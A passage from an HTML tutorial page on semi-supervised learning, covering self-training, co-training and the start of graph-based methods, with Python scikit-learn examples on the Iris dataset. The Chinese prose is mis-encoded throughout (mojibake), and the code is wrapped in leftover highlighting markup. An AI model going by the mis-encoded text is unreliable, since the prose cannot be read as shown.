                c=y_labeled, cmap=plt.cm.Set1, edgecolor=<span class="hljs-string">'k'</span>, label=<span class="hljs-string">'Labeled'</span>)
    plt.title(title)
    plt.legend()
    plt.show()

<span class="hljs-comment"># 3. è‡ªè®­ç»ƒå¾ªç¯</span>
<span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
    plot_step(X_labeled, y_labeled, X_unlabeled, <span class="hljs-string">f"Iteration <span class="hljs-subst">{step}</span>"</span>)
    
    probs = model.predict_proba(X_unlabeled)
    pseudo_labels = probs.argmax(axis=<span class="hljs-number">1</span>)
    confidences = probs.<span class="hljs-built_in">max</span>(axis=<span class="hljs-number">1</span>)
    mask = confidences &gt; <span class="hljs-number">0.9</span>  <span class="hljs-comment"># é«˜ç½®ä¿¡åº¦æ ·æœ¬</span>
    
    <span class="hljs-keyword">if</span> mask.<span class="hljs-built_in">sum</span>() == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">break</span>
    
    <span class="hljs-comment"># å°†ä¼ªæ ‡ç­¾æ ·æœ¬åŠ å…¥è®­ç»ƒé›†</span>
    X_labeled = np.vstack([X_labeled, X_unlabeled[mask]])
    y_labeled = np.concatenate([y_labeled, pseudo_labels[mask]])
    X_unlabeled = X_unlabeled[~mask]
    
    <span class="hljs-comment"># é‡æ–°è®­ç»ƒ</span>
    model.fit(X_labeled, y_labeled)

<span class="hljs-comment"># æœ€ç»ˆå¯è§†åŒ–</span>
plot_step(X_labeled, y_labeled, X_unlabeled, <span class="hljs-string">"Final Model"</span>)
</code></pre>
<p>è¾“å‡ºå¦‚ä¸‹ï¼ŒèƒŒæ™¯é¢œè‰²è¡¨ç¤ºæ¨¡å‹é¢„æµ‹çš„ åˆ†ç±»åŒºåŸŸï¼›åœ†ç‚¹è¡¨ç¤ºå·²æ ‡æ³¨/ä¼ªæ ‡æ³¨æ ·æœ¬ï¼Œè‰²è¡¨ç¤º æœªæ ‡æ³¨æ ·æœ¬ï¼›</p>
<p>æ¯æ¬¡è¿­ä»£ä¼šç”»ä¸€å¼ å›¾ï¼Œå¯ä»¥çœ‹åˆ°éšç€ä¼ªæ ‡ç­¾æ ·æœ¬åŠ å…¥ï¼Œå†³ç­–è¾¹ç•Œé€æ¸å˜åŒ–ï¼Œè¦†ç›–æ›´å¤šæœªæ ‡æ³¨æ•°æ®ã€‚</p>
<p>åˆå§‹è¿­ä»£æ—¶ï¼Œæ¨¡å‹ä»…ä¾èµ–å°‘é‡æ ‡æ³¨æ ·æœ¬ï¼Œåˆ†ç±»åŒºåŸŸç›¸å¯¹ç‹­çª„ï¼›éšç€é«˜ç½®ä¿¡åº¦ä¼ªæ ‡ç­¾è¢«åŠ å…¥è®­ç»ƒé›†ï¼Œæ¨¡å‹èƒ½å¤Ÿåˆ©ç”¨æ›´å¤šä¿¡æ¯è¿›è¡Œæ›´æ–°ï¼Œè®­ç»ƒæ ·æœ¬åˆ†å¸ƒæ›´åŠ ä¸°å¯Œï¼Œåˆ†ç±»è¾¹ç•Œé€æ¸è°ƒæ•´ï¼Œè¦†ç›–æ›´å¤šæœªæ ‡æ³¨æ ·æœ¬ã€‚æœ€ç»ˆï¼Œæ¨¡å‹çš„å†³ç­–èƒ½åŠ›æ˜æ˜¾å¢å¼ºï¼Œæœªæ ‡æ³¨æ ·æœ¬è¢«è¾ƒå¥½åœ°åˆ’åˆ†åˆ°æ­£ç¡®ç±»åˆ«ä¸­ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b37f2dd105542a1affed039a276f1df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529196&amp;x-signature=gxEdSpyY53eMMyZm6QCaJLs8Pcg%3D" alt="" loading="lazy"/></p>
<p>è‡ªè®­ç»ƒçš„ä¼˜ç‚¹åœ¨äºå®ç°ç®€å•ï¼Œå‡ ä¹å¯ä»¥åº”ç”¨äºä»»ä½•ç›‘ç£å­¦ä¹ æ¨¡å‹ï¼Œä¾‹å¦‚é€»è¾‘å›å½’ã€SVMã€ç¥ç»ç½‘ç»œç­‰ï¼Œè€Œä¸”èƒ½å¤Ÿæœ‰æ•ˆåˆ©ç”¨å¤§é‡æœªæ ‡æ³¨æ•°æ®ï¼Œåœ¨æ ‡æ³¨æ ·æœ¬ç¨€ç¼ºçš„æƒ…å†µä¸‹æå‡æ€§èƒ½ã€‚ç„¶è€Œï¼Œè¯¥æ–¹æ³•ä¹Ÿå­˜åœ¨å±€é™æ€§ï¼šå¦‚æœåˆå§‹æ¨¡å‹è´¨é‡è¾ƒå·®æˆ–é¢„æµ‹å‡ºç°é”™è¯¯ï¼Œé«˜ç½®ä¿¡åº¦çš„ä¼ªæ ‡ç­¾å¯èƒ½ä¼šä¼ æ’­é”™è¯¯ï¼Œä»è€Œé™ä½æ•´ä½“æ€§èƒ½ã€‚æ­¤å¤–ï¼Œå®ƒå¯¹æ•°æ®åˆ†å¸ƒä¹Ÿæœ‰ä¸€å®šä¾èµ–ï¼Œç±»åˆ«åˆ†å¸ƒä¸å‡è¡¡æˆ–è¾¹ç•Œå¤æ‚æ—¶å®¹æ˜“äº§ç”Ÿåå·®ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œç ”ç©¶è€…æå‡ºäº†å¤šç§æ”¹è¿›æ–¹æ³•ï¼Œä¾‹å¦‚åŠ¨æ€è°ƒæ•´ç½®ä¿¡åº¦é˜ˆå€¼ä»¥å‡å°‘é”™è¯¯ä¼ æ’­ï¼Œä½¿ç”¨å¤šä¸ªæ¨¡å‹äº’ç›¸ç”Ÿæˆä¼ªæ ‡ç­¾ä»¥é™ä½åå·®ï¼Œæˆ–è€…ç»“åˆæ·±åº¦å­¦ä¹ ä¸­çš„ä¸€è‡´æ€§æ­£åˆ™åŒ–ã€ç”Ÿæˆå¯¹æŠ—ç½‘ç»œç­‰æ–¹æ³•ï¼Œä»¥å¢å¼ºå¯¹å¤æ‚ä»»åŠ¡çš„é€‚åº”èƒ½åŠ›ã€‚è¿™äº›æ”¹è¿›ä½¿å¾—è‡ªè®­ç»ƒåœ¨å®é™…åº”ç”¨ä¸­æ›´ä¸ºç¨³å¥å’Œé«˜æ•ˆã€‚</p>
<p>ç›®å‰ï¼Œè‡ªè®­ç»ƒå·²ç»åœ¨å¤šä¸ªé¢†åŸŸå¾—åˆ°åº”ç”¨ã€‚åœ¨æ–‡æœ¬åˆ†ç±»ä¸­ï¼Œå®ƒèƒ½åˆ©ç”¨å°‘é‡äººå·¥æ ‡æ³¨çš„è¯­æ–™æ‰©å±•åˆ°å¤§è§„æ¨¡æœªæ ‡æ³¨æ–‡æœ¬ï¼›åœ¨å›¾åƒè¯†åˆ«ä¸­ï¼Œå°¤å…¶æ˜¯åŒ»å­¦å½±åƒå’Œé¥æ„Ÿç­‰æ ‡æ³¨æˆæœ¬é«˜çš„ä»»åŠ¡ä¸­ï¼Œè‡ªè®­ç»ƒèƒ½å¤Ÿæ˜¾è‘—å‡è½»æ ‡æ³¨è´Ÿæ‹…ï¼›åœ¨è¯­éŸ³è¯†åˆ«ä¸­ï¼Œå®ƒä¹Ÿèƒ½å€ŸåŠ©æœªæ ‡æ³¨è¯­éŸ³æ•°æ®æå‡è¯†åˆ«å‡†ç¡®ç‡ã€‚å‡­å€Ÿç®€å•æ€§å’Œçµæ´»æ€§ï¼Œè‡ªè®­ç»ƒä¸ä»…æ˜¯åŠç›‘ç£å­¦ä¹ çš„é‡è¦åŸºçŸ³ï¼Œè¿˜å¸¸ä½œä¸ºæ›´å¤æ‚æ–¹æ³•çš„ç»„æˆéƒ¨åˆ†ï¼Œåœ¨ç°ä»£æœºå™¨å­¦ä¹ ä¸­ä¾ç„¶å‘æŒ¥ç€é‡è¦ä½œç”¨ã€‚</p>
<h2 data-id="heading-1">ååŒè®­ç»ƒ</h2>
<p>ååŒè®­ç»ƒï¼ˆCo-trainingï¼‰æ˜¯åŠç›‘ç£å­¦ä¹ ä¸­ä¸€ç§ç»å…¸ä¸”æœ‰æ•ˆçš„æ–¹æ³•ï¼Œç”± Blum å’Œ Mitchell åœ¨ 1998 å¹´æå‡ºã€‚ä¸è‡ªè®­ç»ƒä¸åŒï¼ŒååŒè®­ç»ƒä¾èµ–äºæ•°æ®å…·æœ‰ ä¸¤ç§æˆ–å¤šç§äº’è¡¥çš„ç‰¹å¾è§†å›¾ï¼ˆviewsï¼‰ï¼Œæ¯ä¸ªè§†å›¾éƒ½èƒ½å¤Ÿå•ç‹¬å®Œæˆåˆ†ç±»ä»»åŠ¡ã€‚</p>
<p>å…¶æ ¸å¿ƒæ€æƒ³æ˜¯è®­ç»ƒä¸¤ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰åˆ†ç±»å™¨ï¼Œåˆ†åˆ«åˆ©ç”¨ä¸åŒè§†å›¾çš„æ ‡æ³¨æ•°æ®è¿›è¡Œåˆå§‹è®­ç»ƒï¼Œç„¶åè®©å®ƒä»¬äº’ç›¸ä¸ºå¯¹æ–¹æä¾›é«˜ç½®ä¿¡åº¦çš„æœªæ ‡æ³¨æ ·æœ¬ä½œä¸ºä¼ªæ ‡ç­¾ï¼Œä»è€Œæ‰©å……è®­ç»ƒé›†ã€‚é€šè¿‡è¿™ç§äº’åŠ©å¼å­¦ä¹ ï¼ŒååŒè®­ç»ƒèƒ½å¤Ÿå……åˆ†åˆ©ç”¨æœªæ ‡æ³¨æ•°æ®æå‡æ¨¡å‹æ€§èƒ½ã€‚</p>
<p>ååŒè®­ç»ƒçš„ä¸€èˆ¬æ­¥éª¤å¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹ï¼š</p>
<ol>
<li>æ•°æ®è§†å›¾åˆ’åˆ†ï¼šå°†åŸå§‹ç‰¹å¾é›†åˆ’åˆ†ä¸ºä¸¤ä¸ªæˆ–å¤šä¸ªäº’è¡¥è§†å›¾ï¼Œä¾‹å¦‚æ–‡æœ¬æ•°æ®å¯ä»¥åˆ†ä¸ºæ ‡é¢˜å’Œæ­£æ–‡ä¸¤éƒ¨åˆ†ï¼›å›¾åƒæ•°æ®å¯ä»¥ä½¿ç”¨ä¸åŒç‰¹å¾æå–æ–¹æ³•ç”Ÿæˆä¸¤ä¸ªè§†å›¾ã€‚</li>
<li>åˆå§‹è®­ç»ƒï¼šä½¿ç”¨å°‘é‡å¸¦æ ‡ç­¾æ ·æœ¬è®­ç»ƒæ¯ä¸ªè§†å›¾å¯¹åº”çš„åˆ†ç±»å™¨ã€‚</li>
<li>äº’åŠ©ä¼ªæ ‡ç­¾ï¼šæ¯ä¸ªåˆ†ç±»å™¨åœ¨æœªæ ‡æ³¨æ•°æ®ä¸Šè¿›è¡Œé¢„æµ‹ï¼Œå¹¶é€‰æ‹©ç½®ä¿¡åº¦è¾ƒé«˜çš„æ ·æœ¬ï¼Œå°†å…¶ä¼ªæ ‡ç­¾æä¾›ç»™å¦ä¸€ä¸ªåˆ†ç±»å™¨ã€‚</li>
<li>è®­ç»ƒé›†æ‰©å……ï¼šå°†ä¼ªæ ‡ç­¾æ ·æœ¬åŠ å…¥è®­ç»ƒé›†ï¼Œé‡æ–°è®­ç»ƒä¸¤ä¸ªåˆ†ç±»å™¨ã€‚</li>
<li>è¿­ä»£æ›´æ–°ï¼šé‡å¤äº’åŠ©ä¼ªæ ‡ç­¾å’Œè®­ç»ƒé›†æ‰©å……çš„è¿‡ç¨‹ï¼Œç›´åˆ°æ¨¡å‹æ”¶æ•›æˆ–è¾¾åˆ°é¢„è®¾è¿­ä»£æ¬¡æ•°ã€‚</li>
</ol>
<p>ä»¥æ–‡æœ¬åˆ†ç±»ä¸ºä¾‹ï¼Œå‡è®¾æˆ‘ä»¬æœ‰æ–°é—»æ–‡ç« æ•°æ®ï¼Œæ¯ç¯‡æ–‡ç« åŒ…å«æ ‡é¢˜å’Œæ­£æ–‡ä¸¤éƒ¨åˆ†ï¼š</p>
<ul>
<li>è§†å›¾ 1ï¼ˆæ ‡é¢˜ï¼‰è®­ç»ƒåˆ†ç±»å™¨ Aï¼›è§†å›¾ 2ï¼ˆæ­£æ–‡ï¼‰è®­ç»ƒåˆ†ç±»å™¨ Bã€‚</li>
<li>åˆ†ç±»å™¨ A é¢„æµ‹æœªæ ‡æ³¨æ ·æœ¬çš„ç±»åˆ«ï¼Œå¹¶å°†é«˜ç½®ä¿¡åº¦æ ·æœ¬æä¾›ç»™ Bï¼›B åŒæ ·å°†é«˜ç½®ä¿¡åº¦æ ·æœ¬æä¾›ç»™ Aã€‚</li>
<li>æ¯æ¬¡è¿­ä»£ï¼Œä¸¤ä¸ªåˆ†ç±»å™¨çš„è®­ç»ƒé›†ä¸æ–­æ‰©å……ï¼Œåˆ©ç”¨æœªæ ‡æ³¨æ•°æ®äº’ç›¸æ”¹è¿›æ€§èƒ½ã€‚</li>
</ul>
<p>è¿™ç§æ–¹æ³•çš„ç‰¹ç‚¹æ˜¯å……åˆ†åˆ©ç”¨ å¤šè§†å›¾ä¹‹é—´çš„äº’è¡¥æ€§ï¼Œåœ¨æ¯ä¸ªè§†å›¾ä¸Šå•ç‹¬è®­ç»ƒå¯èƒ½æ•ˆæœä¸€èˆ¬ï¼Œä½†äº’ç›¸è¾…åŠ©åå¯ä»¥æ˜¾è‘—æå‡æ•´ä½“æ€§èƒ½ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨é¸¢å°¾èŠ±æ•°æ®é›†ï¼ŒæŠŠå‰ä¸¤ä¸ªç‰¹å¾å’Œåä¸¤ä¸ªç‰¹å¾åˆ†åˆ«ä½œä¸ºä¸¤ä¸ªè§†å›¾ï¼Œç”¨ ä¸¤ä¸ªé€»è¾‘å›å½’æ¨¡å‹ äº’ç›¸ç”Ÿæˆä¼ªæ ‡ç­¾ï¼Œè¿­ä»£æ›´æ–°è®­ç»ƒé›†ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression
<span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split

<span class="hljs-comment"># 1. æ•°æ®</span>
X, y = load_iris(return_X_y=<span class="hljs-literal">True</span>)
X_labeled, X_unlabeled, y_labeled, y_unlabeled_true = train_test_split(
    X, y, train_size=<span class="hljs-number">30</span>, stratify=y, random_state=<span class="hljs-number">42</span>
)

<span class="hljs-comment"># 2. PCA å¯è§†åŒ–</span>
pca = PCA(n_components=<span class="hljs-number">2</span>)
X_2d = pca.fit_transform(X)
X_labeled_2d = pca.transform(X_labeled)
X_unlabeled_2d = pca.transform(X_unlabeled)

<span class="hljs-comment"># 3. åˆ’åˆ†è§†å›¾</span>
X_labeled_view1 = X_labeled[:, :<span class="hljs-number">2</span>]
X_labeled_view2 = X_labeled[:, <span class="hljs-number">2</span>:]
X_unlabeled_view1 = X_unlabeled[:, :<span class="hljs-number">2</span>]
X_unlabeled_view2 = X_unlabeled[:, <span class="hljs-number">2</span>:]

<span class="hljs-comment"># 4. åˆ†ç±»å™¨</span>
clf1 = LogisticRegression(max_iter=<span class="hljs-number">200</span>)
clf2 = LogisticRegression(max_iter=<span class="hljs-number">200</span>)
clf1.fit(X_labeled_view1, y_labeled)
clf2.fit(X_labeled_view2, y_labeled)

history = [(X_labeled_2d.copy(), y_labeled.copy(), X_unlabeled_2d.copy())]

<span class="hljs-comment"># 5. ååŒè®­ç»ƒå¾ªç¯</span>
<span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
    probs1 = clf1.predict_proba(X_unlabeled_view1)
    pseudo_labels1 = probs1.argmax(axis=<span class="hljs-number">1</span>)
    confidences1 = probs1.<span class="hljs-built_in">max</span>(axis=<span class="hljs-number">1</span>)

    probs2 = clf2.predict_proba(X_unlabeled_view2)
    pseudo_labels2 = probs2.argmax(axis=<span class="hljs-number">1</span>)
    confidences2 = probs2.<span class="hljs-built_in">max</span>(axis=<span class="hljs-number">1</span>)

    <span class="hljs-comment"># é«˜ç½®ä¿¡åº¦æ ·æœ¬</span>
    mask1 = confidences1 &gt; <span class="hljs-number">0.9</span>
    mask2 = confidences2 &gt; <span class="hljs-number">0.9</span>

    <span class="hljs-comment"># æ–°å¢æ ·æœ¬ï¼šç¡®ä¿ä¸ä¼šé‡å¤</span>
    new_mask = mask1 | mask2
    <span class="hljs-keyword">if</span> new_mask.<span class="hljs-built_in">sum</span>() == <span class="hljs-number">0</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Step <span class="hljs-subst">{step+<span class="hljs-number">1</span>}</span>: no confident samples, stop."</span>)
        <span class="hljs-keyword">break</span>

    <span class="hljs-comment"># ç”Ÿæˆä¼ªæ ‡ç­¾</span>
    pseudo_labels = np.where(mask1, pseudo_labels1, pseudo_labels2)
    
    <span class="hljs-comment"># æ›´æ–°è®­ç»ƒé›†</span>
    X_labeled_view1 = np.vstack([X_labeled_view1, X_unlabeled_view1[new_mask]])
    X_labeled_view2 = np.vstack([X_labeled_view2, X_unlabeled_view2[new_mask]])
    X_labeled_2d = np.vstack([X_labeled_2d, X_unlabeled_2d[new_mask]])
    y_labeled = np.concatenate([y_labeled, pseudo_labels[new_mask]])

    <span class="hljs-comment"># ç§»é™¤å·²åŠ å…¥çš„æœªæ ‡æ³¨æ ·æœ¬</span>
    X_unlabeled_view1 = X_unlabeled_view1[~new_mask]
    X_unlabeled_view2 = X_unlabeled_view2[~new_mask]
    X_unlabeled_2d = X_unlabeled_2d[~new_mask]

    <span class="hljs-comment"># é‡æ–°è®­ç»ƒ</span>
    clf1.fit(X_labeled_view1, y_labeled)
    clf2.fit(X_labeled_view2, y_labeled)

    <span class="hljs-comment"># ä¿å­˜çŠ¶æ€</span>
    history.append((X_labeled_2d.copy(), y_labeled.copy(), X_unlabeled_2d.copy()))

<span class="hljs-comment"># 6. ç»˜å›¾ 2x2 ç½‘æ ¼</span>
fig, axes = plt.subplots(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, figsize=(<span class="hljs-number">18</span>, <span class="hljs-number">12</span>))
axes = axes.flatten()

<span class="hljs-keyword">for</span> i, (X_l, y_l, X_u) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(history):
    ax = axes[i]
    ax.scatter(X_u[:, <span class="hljs-number">0</span>], X_u[:, <span class="hljs-number">1</span>], c=<span class="hljs-string">'gray'</span>, label=<span class="hljs-string">'Unlabeled'</span>, alpha=<span class="hljs-number">0.5</span>)
    ax.scatter(X_l[:, <span class="hljs-number">0</span>], X_l[:, <span class="hljs-number">1</span>], c=y_l, cmap=<span class="hljs-string">'Set1'</span>, edgecolor=<span class="hljs-string">'k'</span>, label=<span class="hljs-string">'Labeled'</span>)
    ax.set_title(<span class="hljs-string">f"Iteration <span class="hljs-subst">{i}</span>"</span>)
    ax.legend()

<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(history), <span class="hljs-number">4</span>):
    axes[j].axis(<span class="hljs-string">'off'</span>)

plt.tight_layout()
plt.show()
</code></pre>
<p>å…¶ä¸­çš„æ­¥éª¤å¤§æ¦‚ä¸º</p>
<ol>
<li>è§†å›¾åˆ’åˆ†ï¼šè¿™é‡ŒæŠŠå‰ä¸¤ä¸ªç‰¹å¾ä½œä¸ºè§†å›¾ 1ï¼Œåä¸¤ä¸ªç‰¹å¾ä½œä¸ºè§†å›¾ 2ã€‚</li>
<li>äº’åŠ©ä¼ªæ ‡ç­¾ï¼šæ¯ä¸ªåˆ†ç±»å™¨å°†é«˜ç½®ä¿¡åº¦çš„é¢„æµ‹ç»“æœåŠ å…¥å¦ä¸€ä¸ªåˆ†ç±»å™¨çš„è®­ç»ƒé›†ã€‚</li>
<li>è¿­ä»£æ›´æ–°ï¼šå¾ªç¯å‡ æ­¥ï¼Œè®­ç»ƒé›†ä¸æ–­æ‰©å……ï¼Œæ¨¡å‹æ€§èƒ½æå‡ã€‚</li>
<li>é«˜ç½®ä¿¡åº¦é˜ˆå€¼ï¼šè¿™é‡Œç”¨ 0.9ï¼Œä¿è¯åŠ å…¥è®­ç»ƒé›†çš„ä¼ªæ ‡ç­¾å¯é æ€§ã€‚</li>
</ol>
<p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼Œå…¶ä¸­æ˜¾ç¤ºååŒè®­ç»ƒèƒ½å¤Ÿåœ¨å°‘é‡åˆå§‹æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä¸¤ä¸ªä¸åŒè§†å›¾çš„åˆ†ç±»å™¨äº’ç›¸æä¾›é«˜ç½®ä¿¡åº¦ä¼ªæ ‡ç­¾ï¼Œé€æ­¥å°†æœªæ ‡æ³¨æ ·æœ¬åŠ å…¥è®­ç»ƒé›†ï¼Œä½¿è®­ç»ƒé›†è§„æ¨¡ä¸æ–­æ‰©å¤§ï¼Œå½©è‰²ç‚¹é€æ¸è¦†ç›–ç°è‰²æœªæ ‡æ³¨æ ·æœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87375c9b56604fce8becc58bb5adc4cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529196&amp;x-signature=hzxee7I3tYlw9HayZzUG3kDss9Q%3D" alt="" loading="lazy"/></p>
<p>ååŒè®­ç»ƒçš„ä¼˜ç‚¹åœ¨äºèƒ½å¤Ÿå……åˆ†åˆ©ç”¨æœªæ ‡æ³¨æ•°æ®ï¼Œç‰¹åˆ«é€‚åˆ å¤šè§†å›¾ä¿¡æ¯ä¸°å¯Œ çš„ä»»åŠ¡ï¼Œå¦‚ç½‘é¡µåˆ†ç±»ï¼ˆæ ‡é¢˜ä¸æ­£æ–‡ï¼‰ã€å¤šæ¨¡æ€æ•°æ®ï¼ˆå›¾åƒä¸æ–‡æœ¬ç‰¹å¾ï¼‰ã€éŸ³è§†é¢‘åˆ†æç­‰ã€‚ç›¸æ¯”è‡ªè®­ç»ƒï¼ŒååŒè®­ç»ƒæ›´ç¨³å¥ï¼Œå› ä¸ºä¸¤ä¸ªåˆ†ç±»å™¨äº’ç›¸ç›‘ç£ï¼Œå•ä¸€æ¨¡å‹çš„é”™è¯¯ä¸å®¹æ˜“ä¼ æ’­ã€‚</p>
<p>ç„¶è€Œï¼ŒååŒè®­ç»ƒä¹Ÿå­˜åœ¨å±€é™æ€§ã€‚é¦–å…ˆï¼Œå®ƒä¾èµ–äºç‰¹å¾è§†å›¾çš„å……åˆ†äº’è¡¥æ€§ï¼Œå¦‚æœä¸¤ä¸ªè§†å›¾é«˜åº¦ç›¸å…³æˆ–æŸä¸ªè§†å›¾ä¿¡æ¯ä¸è¶³ï¼Œæ•ˆæœå¯èƒ½ä¸ä½³ã€‚å…¶æ¬¡ï¼Œä¼ªæ ‡ç­¾çš„è´¨é‡ä»ç„¶ä¼šå½±å“è¿­ä»£è¿‡ç¨‹ï¼Œå¦‚æœä¸¤ä¸ªåˆ†ç±»å™¨éƒ½äº§ç”Ÿå¤§é‡é”™è¯¯ä¼ªæ ‡ç­¾ï¼Œæ¨¡å‹æ€§èƒ½å¯èƒ½ä¸‹é™ã€‚ä¸ºäº†æ”¹è¿›ï¼Œç ”ç©¶è€…æå‡ºäº†æ–¹æ³•ï¼Œä¾‹å¦‚åŠ¨æ€é€‰æ‹©æœ€å¯é çš„ä¼ªæ ‡ç­¾ã€å¼•å…¥ä¸€è‡´æ€§çº¦æŸæˆ–ç»“åˆæ·±åº¦ç‰¹å¾å­¦ä¹ ï¼Œä»¥å¢å¼ºåœ¨å¤æ‚ä»»åŠ¡ä¸­çš„é€‚åº”æ€§ã€‚</p>
<p>ååŒè®­ç»ƒåœ¨å®é™…åº”ç”¨ä¸­å·²ç»è¢«å¹¿æ³›ä½¿ç”¨ã€‚åœ¨æ–‡æœ¬åˆ†ç±»ä¸­ï¼Œå¯ä»¥åˆ©ç”¨æ ‡é¢˜ä¸æ­£æ–‡ä¸¤ä¸ªè§†å›¾äº’ç›¸æä¾›ä¿¡æ¯ï¼Œå‡å°‘äººå·¥æ ‡æ³¨æˆæœ¬ï¼›åœ¨å›¾åƒè¯†åˆ«å’Œå¤šæ¨¡æ€ä»»åŠ¡ä¸­ï¼Œä¸åŒç‰¹å¾æå–æ–¹å¼å¯ä»¥å½¢æˆäº’è¡¥è§†å›¾ï¼Œæå‡åˆ†ç±»å‡†ç¡®ç‡ï¼›åœ¨ç½‘é¡µæ¨èæˆ–ç¤¾äº¤ç½‘ç»œåˆ†æä¸­ï¼Œç”¨æˆ·è¡Œä¸ºå’Œå†…å®¹ç‰¹å¾ä¹Ÿå¯ä½œä¸ºä¸¤ç§è§†å›¾è¿›è¡ŒååŒè®­ç»ƒã€‚</p>
<h2 data-id="heading-2">å›¾åŠç›‘ç£å­¦ä¹ </h2>
<p>å›¾åŠç›‘ç£å­¦ä¹ æ˜¯ä¸€ç±»åˆ©ç”¨å›¾ç»“æ„è¡¨ç¤ºæ•°æ®å…³ç³»ï¼Œå¹¶åœ¨å°‘é‡æ ‡æ³¨æ ·æœ¬æŒ‡å¯¼ä¸‹è¿›è¡Œé¢„æµ‹çš„æœºå™¨å­¦ä¹ æ–¹æ³•ã€‚ä¸ä¼ ç»ŸåŠç›‘ç£å­¦ä¹ ä¸åŒï¼Œå›¾åŠç›‘ç£å­¦ä¹ ä¸ä»…è€ƒè™‘å•ä¸ªæ ·æœ¬ç‰¹å¾ï¼Œè¿˜å°†æ ·æœ¬ä¹‹é—´çš„ç›¸ä¼¼æ€§æˆ–é‚»æ¥å…³ç³»ç¼–ç ä¸ºå›¾ç»“æ„ï¼Œé€šè¿‡å›¾çš„ä¼ æ’­æœºåˆ¶å°†æ ‡æ³¨ä¿¡æ¯æ‰©æ•£åˆ°æœªæ ‡æ³¨èŠ‚ç‚¹ä¸Šï¼Œä»è€Œå®ç°å…¨å±€ä¸€è‡´æ€§çš„å­¦ä¹ ã€‚è¯¥æ–¹æ³•ç‰¹åˆ«é€‚ç”¨äºæ•°æ®å¤©ç„¶å…·æœ‰ç½‘ç»œç»“æ„çš„åœºæ™¯ï¼Œå¦‚ç¤¾äº¤ç½‘ç»œã€çŸ¥è¯†å›¾è°±ã€åˆ†å­ç»“æ„å’Œæ¨èç³»ç»Ÿç­‰ã€‚</p>
<p>åœ¨å›¾åŠç›‘ç£å­¦ä¹ ä¸­ï¼Œé¦–å…ˆå°†æ•°æ®æ„å»ºä¸ºå›¾ ï¼Œå…¶ä¸­èŠ‚ç‚¹ è¡¨ç¤ºæ ·æœ¬ï¼Œè¾¹ è¡¨ç¤ºæ ·æœ¬ä¹‹é—´çš„ç›¸ä¼¼æ€§æˆ–å…³è”ã€‚é€šå¸¸ï¼Œè¾¹çš„æƒé‡ é€šè¿‡æ ·æœ¬é—´ç‰¹å¾è·ç¦»æˆ–ç›¸ä¼¼æ€§åº¦ é‡ï¼ˆå¦‚é«˜æ–¯æ ¸ï¼‰è®¡ç®—å¾—åˆ°ã€‚</p>
<p>å›¾åŠç›‘ç£å­¦ä¹ çš„æ ¸å¿ƒæ€æƒ³æ˜¯â€œæ ‡ç­¾å¹³æ»‘å‡è®¾ï¼ˆlabel smoothness assumptionï¼‰â€ï¼Œå³ç›¸è¿çš„èŠ‚ç‚¹å€¾å‘äºå…·æœ‰ç›¸åŒæ ‡ç­¾ã€‚åŸºäºè¿™ä¸€å‡è®¾ï¼Œå¯ä»¥é€šè¿‡ä¼˜åŒ–ç›®æ ‡æˆ–ä¼ æ’­ç®—æ³•ï¼Œå°†å°‘é‡æ ‡æ³¨ä¿¡æ¯ä¼ æ’­åˆ°æ•´ä¸ªå›¾ä¸­ï¼Œä»è€Œå¯¹æœªæ ‡æ³¨èŠ‚ç‚¹è¿›è¡Œé¢„æµ‹ã€‚</p>
<h3 data-id="heading-3">å…¸å‹æ–¹æ³•</h3>
<ol>
<li>æ ‡ç­¾ä¼ æ’­ï¼ˆLabel Propagation, LPï¼‰</li>
</ol>
<p>æ ‡ç­¾ä¼ æ’­æ–¹æ³•åˆ©ç”¨å›¾çš„é‚»æ¥çŸ©é˜µå’Œå½’ä¸€åŒ–æƒé‡ï¼Œé€šè¿‡è¿­ä»£æ›´æ–°æœªæ ‡æ³¨èŠ‚ç‚¹çš„æ ‡ç­¾åˆ†å¸ƒï¼Œç›´åˆ°æ”¶æ•›ã€‚æ¯è½®è¿­ä»£ä¸­ï¼ŒèŠ‚ç‚¹çš„æ ‡ç­¾ä¿¡æ¯æ ¹æ®é‚»å±…èŠ‚ç‚¹çš„æ ‡ç­¾åŠ æƒå¹³å‡æ›´æ–°ï¼Œä»è€Œå®ç°æ ‡ç­¾çš„å¹³æ»‘æ‰©æ•£ã€‚</p>
<ol start="2">
<li>å›¾æ­£åˆ™åŒ–æ–¹æ³•ï¼ˆGraph Regularizationï¼‰</li>
</ol>
